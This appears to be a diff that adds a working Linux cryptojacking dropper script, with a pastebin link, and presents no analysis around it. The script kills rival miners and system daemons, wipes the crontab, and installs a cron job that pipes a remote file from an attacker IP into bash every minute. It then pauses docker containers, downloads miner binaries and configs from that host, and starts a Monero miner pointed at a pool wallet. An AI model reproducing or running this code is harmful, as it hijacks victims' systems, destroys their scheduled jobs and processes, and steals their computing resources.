@@ -1,0 +1,169 @@
+
+https://pastebin.com/raw/bHHcCdpr
+#!/bin/sh
+pkill -f atd
+pkill -f pubg
+pkill -f accounts-daemon
+pkill -f 192.99.56.117
+pkill -9 192.99.56.117
+pkill -f 142.4.124.164
+pkill -9 142.4.124.164
+pkill -f minergate
+pkill -f minergate-cli
+pkill -f ./sshd
+pkill -f jva
+pkill -9 jva
+pkill -f myatd
+pkill -f ddg
+pkill -f 128.199.86.57
+pkill -f mutex
+pkill -f mule
+pkill -f pubg
+pkill -f watch-smart
+pkill -f carbon
+pkill -f Carbon
+pkill -f AnXqV.yam
+rm -rf /dev/shm/jboss
+ps -fe|grep seervceaess |grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+rm -rf /var/tmp/ysjswirmrm.conf
+rm -rf /var/tmp/sshd
+mkdir /var/tmp
+pkill -9 tratum
+pkill -9 mixnerdx
+pkill -9 performedl
+pkill -9 sleep
+pkill -9 /tmp/httpd.conf
+pkill -9 JnKihGjn
+pkill -9 irqba2anc1
+pkill -9 irqba5xnc1
+pkill -9 irqbnc1
+pkill -9 ir29xc1
+pkill -9 conns
+ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk '{if($3>60.0) print "kill -9 " $2}'|sh
+pkill -9 irqbalance
+pkill -9 crypto-pool
+pkill -9 XJnRj
+pkill -9 NXLAi
+pkill -9 BI5zj
+pkill -9 askdljlqw
+pkill -9 minerd
+pkill -9 minergate
+pkill -9 Guard.sh
+pkill -9 ysaydh
+pkill -9 bonns
+pkill -9 donns
+pkill -9 kxjd
+pkill -f sleep
+pkill -f /tmp/m
+pkill -f JnKihGjn
+pkill -f irqba2anc1
+pkill -f irqba5xnc1
+pkill -f conns
+pkill -f irqbalance
+pkill -f crypto-pool
+pkill -f XJnRj
+pkill -f NXLAi
+pkill -f BI5zj
+pkill -f askdljlqw
+pkill -f minerd
+pkill -f minergate
+pkill -f Guard.sh
+pkill -f ysaydh
+pkill -f bonns
+pkill -f donns
+pkill -f kxjd
+pkill -f 108.61.186.224
+pkill -f Duck.sh
+pkill -f bonn.sh
+pkill -f conn.sh
+pkill -f kworker34
+pkill -f kw.sh
+pkill -f pro.sh
+pkill -f polkitd
+pkill -f acpid
+pkill -f bb
+pkill -9 atd
+pkill -9 accounts-daemon
+pkill -f yam
+ps auxf|grep -v grep|grep -v ovpvwbvtat|grep "/tmp/"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "\./"|grep 'httpd.conf'|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "\-p x"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "cryptonight"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "ysjswirmrm"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "snapd"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "mysql_dump"|awk '{print $2}'|xargs kill -9
+crontab -r || true && \
+echo "* * * * * curl -s http://67.231.243.10:8220/logo3.jpg | bash -s" >> /tmp/cron || true && \
+crontab /tmp/cron || true && \
+rm -rf /tmp/cron || true && \
+docker pause `docker ps|grep kube-apis |awk '{print $1}'`
+docker pause `docker ps|grep nginx78 |awk '{print $1}'`
+curl -o /var/tmp/config.json http://67.231.243.10:8220/config_1.json
+curl -o /var/tmp/seervceaess http://67.231.243.10:8220/gcc
+chmod 777 /var/tmp/seervceaess
+cd /var/tmp
+proc=`grep -c ^processor /proc/cpuinfo`
+cores=$(($proc+1))
+num=$(($cores*3))
+/sbin/sysctl -w vm.nr_hugepages=`$num`
+nohup ./seervceaess -c config.json -t `echo $cores` >/dev/null &
+fi
+ps -fe|grep seervceaess |grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+curl -o /var/tmp/config.json http://67.231.243.10:8220/c1.json
+curl -o /var/tmp/seervceaess http://67.231.243.10:8220/minerd
+chmod 777 /var/tmp/seervceaess
+cd /var/tmp
+proc=`grep -c ^processor /proc/cpuinfo`
+cores=$(($proc+1))
+num=$(($cores*3))
+/sbin/sysctl -w vm.nr_hugepages=`$num`
+nohup ./seervceaess -c config.json -t `echo $cores` >/dev/null &
+fi
+if [ $? -eq 0 ]
+then
+pwd
+else
+curl -o /var/tmp/config.json http://67.231.243.10:8220/kworker.json
+curl -o /var/tmp/seervceaess http://67.231.243.10:8220/atd2
+chmod 777 /var/tmp/seervceaess
+cd /var/tmp
+proc=`grep -c ^processor /proc/cpuinfo`
+cores=$(($proc+1))
+num=$(($cores*3))
+/sbin/sysctl -w vm.nr_hugepages=`$num`
+nohup ./seervceaess -c config.json -t `echo $cores` >/dev/null &
+fi
+if [ $? -eq 0 ]
+then
+pwd
+else
+curl -o /var/tmp/config.json http://67.231.243.10:8220/kworker.json
+curl -o /var/tmp/seervceaess http://67.231.243.10:8220/atd3
+chmod 777 /var/tmp/seervceaess
+cd /var/tmp
+proc=`grep -c ^processor /proc/cpuinfo`
+cores=$(($proc+1))
+num=$(($cores*3))
+/sbin/sysctl -w vm.nr_hugepages=`$num`
+nohup ./seervceaess -c config.json -t `echo $cores` >/dev/null &
+fi
+ps -fe|grep seervceaess |grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+curl -o /var/tmp/seervceaess http://67.231.243.10:8220/yam
+chmod 777 /var/tmp/seervceaess
+cd /var/tmp
+nohup ./seervceaess -c x -M stratum+tcp://41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo:x@monerohash.com:3333/xmr  >/dev/null &
+fi
+echo "runing....."
